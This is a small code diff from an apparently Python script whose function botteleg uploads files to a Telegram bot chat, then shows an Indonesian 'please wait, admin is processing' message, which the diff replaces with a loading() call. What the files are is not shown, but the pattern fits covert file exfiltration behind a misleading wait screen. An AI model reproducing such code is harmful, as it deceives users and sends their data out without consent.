@@ -776,8 +776,9 @@ def botteleg():
 				data = {"chat_id": CHAT_ID}
 				response = requests.post(url, data=data, files=files)
 				if response.status_code == 200:
-					print(f"Tunggu sebentar script anda sedang admin proses membutuhkan waktu 3 menit")
-					time.sleep(180)
+					loading()
+					#print(f" Tunggu sebentar script anda sedang admin proses membutuhkan waktu 3 menit")
+					#time.sleep()
 					menu()
 					
 				else:
